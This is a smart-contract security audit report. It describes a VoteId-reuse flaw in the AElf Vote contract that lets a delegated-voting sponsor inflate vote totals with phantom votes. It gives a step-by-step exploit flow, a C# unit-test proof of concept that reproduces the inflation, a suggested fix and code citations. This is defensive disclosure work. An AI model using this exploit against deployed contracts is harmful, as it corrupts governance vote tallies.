# Audit Report

## Title
Vote Inflation via VoteId Reuse in Delegated Voting

## Summary
The Vote contract allows sponsors of delegated voting items to reuse VoteId values across multiple Vote calls, causing vote amounts to accumulate in VotingResult while overwriting the VotingRecord. This results in permanent phantom votes that cannot be withdrawn, corrupting voting integrity.

## Finding Description

The vulnerability exists in the delegated voting flow (IsLockToken=false) where the sponsor controls the VoteId parameter. The `AssertValidVoteInput` method only validates that VoteId is not null, without checking for uniqueness [1](#0-0) .

When a vote is cast, the VotingRecord is stored by direct assignment, which overwrites any existing record with the same VoteId [2](#0-1) .

However, the `UpdateVotingResult` method unconditionally accumulates the vote amount to the results without checking if this VoteId was previously used [3](#0-2) .

During withdrawal, only the final stored amount from VotingRecord is subtracted from VotingResult [4](#0-3) .

**Exploit Flow:**
1. Sponsor calls Vote(VoteId=X, Amount=100) → VotingRecord[X]=100, VotingResult+=100
2. Sponsor calls Vote(VoteId=X, Amount=200) → VotingRecord[X]=200 (overwrite), VotingResult+=200 (total=300)
3. Sponsor calls Withdraw(VoteId=X) → VotingResult-=200, leaving 100 phantom votes

**Proper Protection Example:**
The Election contract demonstrates the correct duplicate prevention pattern using a mapping check [5](#0-4) .

For non-delegated voting (IsLockToken=true), VoteId is auto-generated using votingResult.VotesAmount, making duplicates naturally unlikely [6](#0-5) .

## Impact Explanation

**High Severity** due to:

1. **Permanent Data Corruption**: Phantom votes remain in VotingResult indefinitely with no mechanism to remove them, as there's no corresponding VotingRecord to track them.

2. **Governance Integrity Violation**: Vote tallies used for decision-making become inflated and inaccurate, undermining the fundamental purpose of voting systems.

3. **Downstream System Impact**: Any contracts or systems relying on Vote contract results (such as Election contract integrations) make decisions based on corrupted data.

4. **Protocol Invariant Break**: Violates the critical invariant that total votes in VotingResult must equal the sum of all active VotingRecords.

## Likelihood Explanation

**High Likelihood** because:

1. **Low Attack Complexity**: Requires only calling the public Vote method multiple times with identical VoteId - no complex transaction sequences or timing requirements.

2. **Minimal Prerequisites**: Attacker only needs to be the sponsor of a delegated voting item, which is a standard use case explicitly supported by the contract design for contract-managed voting scenarios.

3. **No Additional Protections**: The code path has no rate limiting, duplicate detection, or state validation to prevent this attack.

4. **Difficult Detection**: The exploitation appears as normal voting activity and only becomes evident upon withdrawal when amounts don't match expectations.

5. **Realistic Discovery**: Any malicious or even curious sponsor testing contract boundaries would quickly discover this vulnerability.

## Recommendation

Add a uniqueness check for VoteId in the `AssertValidVoteInput` method, similar to the Election contract pattern:

```csharp
private VotingItem AssertValidVoteInput(VoteInput input)
{
    var votingItem = AssertVotingItem(input.VotingItemId);
    Assert(input.Option.Length <= VoteContractConstants.OptionLengthLimit, "Invalid input.");
    Assert(votingItem.Options.Contains(input.Option), $"Option {input.Option} not found.");
    Assert(votingItem.CurrentSnapshotNumber <= votingItem.TotalSnapshotNumber,
        "Current voting item already ended.");
    if (!votingItem.IsLockToken)
    {
        Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
        Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
        Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        // ADD THIS CHECK:
        Assert(State.VotingRecords[input.VoteId] == null, "Vote Id already exists.");
    }
    else
    {
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        input.Voter = Context.Sender;
        input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
    }
    return votingItem;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task VoteIdReuse_InflatesVotingResults()
{
    // Register a delegated voting item (IsLockToken=false)
    var votingItem = await RegisterVotingItemAsync(100, 3, false, DefaultSender, 1);
    var voter = Accounts[11].Address;
    var voteId = HashHelper.ComputeFrom("duplicate-vote-id");
    
    // First vote with VoteId=X, Amount=100
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Voter = voter,
        VoteId = voteId,
        Option = votingItem.Options[0],
        Amount = 100
    });
    
    var resultAfterFirstVote = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput
        {
            VotingItemId = votingItem.VotingItemId,
            SnapshotNumber = 1
        });
    resultAfterFirstVote.VotesAmount.ShouldBe(100);
    
    // Second vote with SAME VoteId=X, Amount=200
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Voter = voter,
        VoteId = voteId,
        Option = votingItem.Options[0],
        Amount = 200
    });
    
    // VotingResult should show 300 (100 + 200 accumulated)
    var resultAfterSecondVote = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput
        {
            VotingItemId = votingItem.VotingItemId,
            SnapshotNumber = 1
        });
    resultAfterSecondVote.VotesAmount.ShouldBe(300); // INFLATED!
    
    // VotingRecord only shows 200 (overwritten)
    var votingRecord = await VoteContractStub.GetVotingRecord.CallAsync(voteId);
    votingRecord.Amount.ShouldBe(200);
    
    // Withdraw removes only 200, leaving 100 phantom votes
    await VoteContractStub.Withdraw.SendAsync(new WithdrawInput { VoteId = voteId });
    
    var resultAfterWithdraw = await VoteContractStub.GetVotingResult.CallAsync(
        new GetVotingResultInput
        {
            VotingItemId = votingItem.VotingItemId,
            SnapshotNumber = 1
        });
    
    // 100 phantom votes remain permanently
    resultAfterWithdraw.VotesAmount.ShouldBe(100); // PHANTOM VOTES!
    
    // But no VotingRecord exists to track these votes
    votingRecord = await VoteContractStub.GetVotingRecord.CallAsync(voteId);
    votingRecord.IsWithdrawn.ShouldBe(true);
}
```

This test demonstrates that calling Vote twice with the same VoteId results in vote inflation (300 total) while only 200 can be withdrawn, leaving 100 permanent phantom votes in the system.

### Citations

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L117-117)
```csharp
        State.VotingRecords[input.VoteId] = votingRecord;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L214-220)
```csharp
        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);

        votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L384-388)
```csharp
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L390-398)
```csharp
        else
        {
            var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
            var votingResult = State.VotingResults[votingResultHash];
            // Voter = Transaction Sender
            input.Voter = Context.Sender;
            // VoteId = Transaction Id;
            input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L432-434)
```csharp
        var voteId = GenerateVoteId(input);
        Assert(State.LockTimeMap[voteId] == 0, "Vote already exists.");
        State.LockTimeMap[voteId] = lockSeconds;
```
